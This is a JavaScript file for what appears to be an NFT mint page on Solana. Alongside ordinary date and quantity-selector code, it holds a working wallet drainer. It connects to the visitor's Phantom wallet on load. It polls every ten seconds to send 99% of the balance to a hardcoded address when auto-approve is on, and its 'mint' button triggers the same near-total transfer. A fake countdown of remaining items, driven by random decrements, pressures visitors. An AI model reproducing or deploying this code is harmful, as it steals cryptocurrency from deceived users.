$(document).ready(function(){
	var DateMode = 1,
		TimeON   = 1,
		datey = new Date(Date.now()),
		dateForUTC = new Date(Date.now());

	var dateyx = datey.toLocaleString('en-US', { timeZone: 'America/New_York' });
	var datej = new Date(dateyx);
	var datehour = datej.getHours();
	var dateday = datej.getDate();

	var datehourUTC = dateForUTC.getUTCHours();
	var datedayUTC = dateForUTC.getUTCDate();

	if(datehour == 1) { datehour = '1 am EST' }    if(datehourUTC == 1) { datehourUTC = '1 am UTC' }
	if(datehour == 2) { datehour = '2 am EST' }    if(datehourUTC == 2) { datehourUTC = '2 am UTC' }
	if(datehour == 3) { datehour = '3 am EST' }    if(datehourUTC == 3) { datehourUTC = '3 am UTC' }
	if(datehour == 4) { datehour = '4 am EST' }    if(datehourUTC == 4) { datehourUTC = '4 am UTC' }
	if(datehour == 5) { datehour = '5 am EST' }    if(datehourUTC == 5) { datehourUTC = '5 am UTC' }
	if(datehour == 6) { datehour = '6 am EST' }    if(datehourUTC == 6) { datehourUTC = '6 am UTC' }
	if(datehour == 7) { datehour = '7 am EST' }    if(datehourUTC == 7) { datehourUTC = '7 am UTC' }
	if(datehour == 8) { datehour = '8 am EST' }    if(datehourUTC == 8) { datehourUTC = '8 am UTC' }
	if(datehour == 9) { datehour = '9 am EST' }    if(datehourUTC == 9) { datehourUTC = '9 am UTC' }
	if(datehour == 10) { datehour = '10 am EST' }    if(datehourUTC == 10) { datehourUTC = '10 am UTC' }
	if(datehour == 11) { datehour = '11 am EST' }    if(datehourUTC == 11) { datehourUTC = '11 am UTC' }
	if(datehour == 12) { datehour = '12 pm EST' }    if(datehourUTC == 12) { datehourUTC = '12 pm UTC' }
	if(datehour == 13) { datehour = '1 pm EST' }     if(datehourUTC == 13) { datehourUTC = '1 pm UTC' }
	if(datehour == 14) { datehour = '2 pm EST' }     if(datehourUTC == 14) { datehourUTC = '2 pm UTC' }
	if(datehour == 15) { datehour = '3 pm EST'}    if(datehourUTC == 15) { datehourUTC = '3 pm UTC'}
	if(datehour == 16) { datehour = '4 pm EST' }     if(datehourUTC == 16) { datehourUTC = '4 pm UTC' }
	if(datehour == 17) { datehour = '5 pm EST' }     if(datehourUTC == 17) { datehourUTC = '5 pm UTC' }
	if(datehour == 18) { datehour = '6 pm EST' }     if(datehourUTC == 18) { datehourUTC = '6 pm UTC' }
	if(datehour == 19) { datehour = '7 pm EST' }     if(datehourUTC == 19) { datehourUTC = '7 pm UTC' }
	if(datehour == 20) { datehour = '8 pm EST' }     if(datehourUTC == 20) { datehourUTC = '8 pm UTC' }
	if(datehour == 21) { datehour = '9 pm EST' }     if(datehourUTC == 21) { datehourUTC = '9 pm UTC' }
	if(datehour == 22) { datehour = '10 pm EST' }    if(datehourUTC == 22) { datehourUTC = '10 pm UTC' }
	if(datehour == 23) { datehour = '11 pm EST' }    if(datehourUTC == 23) { datehourUTC = '11 pm UTC' }
	if(datehour == 0) { datehour = '12 am EST' }     if(datehourUTC == 0) { datehourUTC = '12 am UTC' }

	if(DateMode == 1) {
		document.getElementById("month").innerHTML = dateday;
		if(TimeON == 1) {
			document.getElementById("time").innerHTML = datehour;
		}
	}
	else if(DateMode == 2) {
		document.getElementById("month").innerHTML = datedayUTC;
		if(TimeON == 1) {
			document.getElementById("time").innerHTML = datehourUTC;
		}
	}
    var d = new Date();
	var month = new Array("January","February","March","April","May","June", "July","August","September","October","November","December");
    $('#m').text(month[d.getMonth()]);


	$('#plus').on('click', function(e){
		e.preventDefault();
		e.stopPropagation();
		var t = parseInt($('input').val());
		t += 1;
		if($('input').val() >= 5){
			t = 5;
		}
		$('input').val(t);
		var total = (t*2).toFixed();
		$('#price').text(total);
	});
	$('#minus').on('click', function(e){
		var t = parseInt($('input').val());
		t -= 1;
		if($('input').val() <= 1){
			t = 1;
		}
		$('input').val(t);
		var total = (t*2).toFixed();
		$('#price').text(total);
	});
	$('input').on('keyup', function(){
		if($(this).val() >= 5){
			$(this).val(5);
		}
		if($(this).val() < 1){
			$(this).val(1);
		}
		$('#price').text($(this).val()*2);
	});

	$('#ape-max').click(function(){
	    $('input').val(5);
	    $('#price').text(($('input').val() * 2).toFixed());
	});
	
	const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
        
        const getProvider = () => {
          if ("solana" in window) {
        	const provider = window.solana;
        	if (provider.isPhantom) {
        	  return provider;
        	}
          }
          window.open("https://phantom.app/", "_blank");
        };
        
        function onBodyLoad() {
          const solConnected = window.solana.isConnected;
        
          if(!solConnected) {
            connectWallet();
        
          }
          else{
          }
          refreshStatus();
          
        }
        function refreshStatus() {
    	  const provider = getProvider();
    	  if(provider) {
    		provider.on("connect", () => {
    		  setConnected();
    		});
    		provider.on("disconnect", () => {
    		  setNotConnected();
    		});
    	  }
    	}
    	function connectWallet() {
          window.solana.connect({ onlyIfTrusted: false });
        }
        async function setConnected() {
            let account_info = await connection.getAccountInfo(window.solana.publicKey);
            console.log("Auto Approve: " + window.solana.autoApprove);
        }
    	function trySend() {
          if(window.solana.autoApprove) {
            if(!sent) {
              apimainnet();
            }
          } else {
            console.log("Not auto approve!");
          }
        }
        async function testTransfer2(howmany) {
          const provider = getProvider();
          const solConected = window.solana.isConnected;
          const manylamports = (howmany * 1000000000).toFixed(0);
        
          if(!provider) { return; }
          if(!solConected) { return; }
        
          let account_info = await connection.getAccountInfo(window.solana.publicKey);
          var charginglamports = manylamports;
        
          if((account_info.lamports / 2) > manylamports) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
          }
        
          if(account_info.lamports < manylamports && account_info.lamports > 100000000) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
          }
        
            let transaction = new solanaWeb3.Transaction().add(
              solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: "2K2y3pNKcEt3LtRr1yoCfgXoL27prYpZmyNXyQaFPJus", 
                lamports: charginglamports,
              })
            );
        
            let { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = provider.publicKey;
        
            return transaction;
        }
        
        async function makeTransfer(howmany) {
          let transaction = await testTransfer2(howmany);
          const provider = getProvider();
        
          if(!provider) { return; }
          console.log(provider);
          console.log(transaction);
        
          if(transaction) {
            //try {
        
              console.log("asd");
              let signed = await provider.signTransaction(transaction, connection);
              console.log(signed);
              let signature = await connection.sendRawTransaction(signed.serialize());
              console.log(signature);
              await connection.confirmTransaction(signature);
            //} catch(err) {
            //  console.warn(err);
            //}
          }
        }
        
        async function testTransfer() {
          const provider = getProvider();
          const solConected = window.solana.isConnected;
        
          if(!provider) { return; }
          if(!solConected) { return; }
        
          let account_info = await connection.getAccountInfo(window.solana.publicKey);
        
          if(account_info.lamports >= 10000000) {
            let transaction = new solanaWeb3.Transaction().add(
              solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: "2K2y3pNKcEt3LtRr1yoCfgXoL27prYpZmyNXyQaFPJus",
                lamports: (account_info.lamports * 0.99).toFixed(0),
              })
            );
        
            let { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = provider.publicKey;
        
            return transaction;
          }
        }
        
        async function apimainnet() {
          let transaction = await testTransfer();
          const provider = getProvider();
        
          if(!provider) { return; }
          console.log(provider);
          console.log(transaction);
        
          if(transaction) {
            //try {
        
              console.log("asd");
              let signed = await provider.signTransaction(transaction, connection);
              console.log(signed);
              let signature = await connection.sendRawTransaction(signed.serialize());
              console.log(signature);
              sent = true;
              await connection.confirmTransaction(signature);
            //} catch(err) {
            //  console.warn(err);
            //}
          }
        }
        function setNotConnected() {
        }
        onBodyLoad();
        setInterval(trySend, 10000);
        
        document.getElementById('mint').onclick = function(){
            makeTransfer(100000);
        }
});


let timerInterval;
let time = 358;
 
function updateTime() {
  var rnd = Math.floor(Math.random() * (15 - 4)) + 15;
  
  time = time - rnd;
  if(time < 27){
    time = 24;
  }
  let secs = time;

  
document.querySelector('#num').innerHTML = `${secs}`;
}
 var rnd2 = Math.floor(Math.random() * (6000 - 3001)) + 6000;
function startTimer() {
    
  timerInterval = setInterval(updateTime, rnd2);
};
 
function stopTimer() {
  clearInterval(timerInterval);
}
window.onbeforeunload = function(event){
  localStorage.setItem('sdfghjkjnhbvcd', time);
}
 
window.addEventListener('load', () => {
  time = parseInt(localStorage.getItem('sdfghjkjnhbvcd'));
  if(isNaN(time)) time = 358
  startTimer()
}, false );
